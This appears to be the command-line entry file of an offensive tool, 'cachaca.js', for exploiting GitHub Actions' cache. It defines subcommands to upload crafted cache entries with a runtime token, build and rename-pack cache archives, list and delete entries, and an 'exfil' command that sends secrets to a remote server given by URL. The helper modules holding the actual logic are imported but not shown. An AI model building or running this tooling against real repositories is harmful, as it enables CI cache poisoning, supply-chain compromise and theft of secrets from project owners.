#!/usr/bin/env node
import { Command } from 'commander';
import { uploadArtifact, computeVersion } from './commands/upload';
import { buildArchive } from './commands/archive';
import { listCaches } from './commands/list';
import { deleteCacheEntry } from './commands/delete';
import { exfilSecrets } from './commands/exfil';

const program = new Command();

program
  .name('cachaca.js')
  .description('CLI tool for exploiting GitHub action\'s cache.')
  .version('1.0.0');

program
  .command('upload')
  .description('Upload a cache entry to GitHub.')
  .requiredOption('-k, --key <key>', 'Cache key')
  .requiredOption('-v, --version <version>', 'Cache version')
  .option('-f, --file <path>', 'Path to the local artifact file')
  .option('-u, --url <url>', 'URL of the remote artifact file')
  .option('-t, --token <token>', 'GitHub token')
  .option('--show-version', 'Display computed version.')
  .action((options) => {

    if(options.showVersion){
      computeVersion(options.version)
    }else{
      uploadArtifact({
        filePath: options.file,
        fileUrl: options.url,
        runtimeToken: options.token,
        key: options.key,
        version: options.version,
      });
    }
    
  });

// Archive command
program
  .command('archive')
  .description('Build a cache archive.')
    .requiredOption('-z, --zstd <path>', 'Path for the archive file')
 .option('-a, --add <path>', 'Source file or directory to archive')
 .option('-r, --rename <name>', 'Rename file in archive.')
  .option('-l, --leading-path <path>', 'Leading path in the archive', '')
  .option('--list', 'List archive content.')
  .action((options) => {
    buildArchive(options.zstd, options.add, options.leadingPath, options.rename, options.list);
  });

program
  .command('list')
  .description('List all cache entries for a repository')
  .option('-t, --token <token>', 'GitHub token')
  .option('-o, --owner <owner>', 'Repository owner (optional, defaults to GitHub context)')
  .option('-r, --repo <repo>', 'Repository name (optional, defaults to GitHub context)')
  .action(async (options) => {
    await listCaches(options.token, options.owner, options.repo);
  });

program
  .command('delete')
  .description('Delete a specific cache entry')
  .requiredOption('-k, --key <key>', 'Cache key to delete')
  .requiredOption('-v, --version <version>', 'Cache version to delete')
  .requiredOption('-t, --token <token>', 'GitHub token')
  .option('-o, --owner <owner>', 'Repository owner (optional, defaults to GitHub context)')
  .option('-r, --repo <repo>', 'Repository name (optional, defaults to GitHub context)')
  .action(async (options) => {
    await deleteCacheEntry(options.key, options.version, options.token, options.owner, options.repo);
  });

program
  .command('exfil')
  .description('Send secrets to a remote server.')
  .requiredOption('-u, --url <url>', 'URL of the remote server')
  .action((options) => {
    exfilSecrets(options.url);
  });

program.parse(process.argv);
